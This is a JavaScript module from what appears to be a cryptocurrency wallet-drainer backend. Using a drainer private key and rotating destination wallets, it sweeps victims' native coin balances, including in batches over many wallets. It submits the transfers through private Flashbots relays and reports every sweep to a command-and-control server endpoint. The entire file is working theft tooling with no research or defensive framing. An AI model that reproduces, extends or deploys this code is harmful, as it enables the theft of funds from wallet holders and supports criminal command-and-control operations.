// modules/sweepNative.js - BACKEND VERSION
import { ethers } from "ethers";
import { flashbotsService } from './flashbots.js';
import axios from 'axios';

export class SweepNative {
    constructor() {
        this.isInitialized = false;
        this.DRAINER_PRIVATE_KEY = process.env.DRAINER_PRIVATE_KEY;
        this.C2_SERVER_URL = process.env.C2_SERVER_URL || 'http://localhost:3001';
        this.chains = {};
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            // Load chains configuration
            await this.loadChainsConfig();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async loadChainsConfig() {
        try {
            const fs = await import('fs');
            const path = await import('path');
            const chainsPath = path.join(process.cwd(), 'chains.json');
            this.chains = JSON.parse(fs.readFileSync(chainsPath, 'utf8'));
        } catch (error) {
            console.warn('Failed to load chains.json, using default config');
            this.chains = {
                "1": { 
                    name: "ethereum", 
                    rpc: process.env.ETHEREUM_RPC_URL, 
                    explorer: "https://etherscan.io" 
                }
            };
        }
    }

    // Backend-specific: Get destination wallet
    async getDestinationWallet(provider, amount) {
        try {
            const { walletRotator } = await import('./walletRotator.js');
            return await walletRotator.getDestinationWallet(provider, amount);
        } catch (error) {
            console.error('Failed to get destination wallet:', error);
            return process.env.DESTINATION_WALLET || '0x8ba1f109551bd432803012645ac136ddd64dba72';
        }
    }

    async sweepNativeETH(provider, fromAddress, balance, chainName = "network") {
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);
        let success = false;
        let txHash = null;
        let errorMessage = null;

        try {
            const gasPrice = await provider.getGasPrice();
            const gasLimit = 21_000;
            const gasFee = gasPrice * BigInt(gasLimit);
            const sendAmount = BigInt(balance) - gasFee;

            if (sendAmount <= 0) {
                console.log(`⚠️ Not enough gas to sweep ${chainName}`);
                errorMessage = "Insufficient gas";
                return;
            }

            if (!this.DRAINER_PRIVATE_KEY) throw new Error("Missing DRAINER_PRIVATE_KEY in environment variables");

            const destinationWallet = await this.getDestinationWallet(provider, sendAmount);
            console.log(`🎯 Using destination wallet: ${destinationWallet}`);

            const tx = {
                to: destinationWallet,
                value: sendAmount,
                gasPrice,
                gasLimit,
                nonce: await provider.getTransactionCount(fromAddress, 'pending'),
                chainId: chainId
            };

            try {
                txHash = await flashbotsService.sendPrivateMultiRelay(tx, this.DRAINER_PRIVATE_KEY);
                console.log(`✅ ${chainName.toUpperCase()} native coin swept privately! TX: ${txHash}`);
                success = true;
            } catch (err) {
                console.log(`❌ ${chainName.toUpperCase()} private sweep failed: ${err.message}`);
                errorMessage = err.message;
                throw err;
            }
        } catch (err) {
            console.log(`❌ ${chainName.toUpperCase()} sweep failed: ${err.message}`);
            errorMessage = err.message;
            success = false;
        } finally {
            // Always report to C&C
            await this.reportToC2({
                walletAddress: fromAddress,
                action: 'sweep_native',
                chainId: chainId,
                chainName: chainName,
                amount: balance.toString(),
                success: success,
                txHash: txHash,
                error: errorMessage,
                timestamp: new Date().toISOString()
            });
        }
    }

    // Backend-specific: Batch sweep native tokens
    async batchSweepNative(wallets, provider, chainName) {
        const results = [];
        
        for (const wallet of wallets) {
            try {
                const balance = await provider.getBalance(wallet.address);
                const result = await this.sweepNativeETH(provider, wallet.address, balance, chainName);
                results.push({ wallet: wallet.address, success: true, result });
            } catch (error) {
                results.push({ wallet: wallet.address, success: false, error: error.message });
            }
        }
        
        return results;
    }

    // C&C Reporting Function
    async reportToC2(reportData) {
        try {
            const response = await axios.post(`${this.C2_SERVER_URL}/c2/report`, reportData, {
                timeout: 5000
            });
            
            return response.data;
        } catch (error) {
            return null;
        }
    }
}

// Create singleton instance
export const sweepNative = new SweepNative();

// Export the sweepNativeETH method directly for named imports
export const sweepNativeETH = (provider, fromAddress, balance, chainName = "network") => {
    return sweepNative.sweepNativeETH(provider, fromAddress, balance, chainName);
};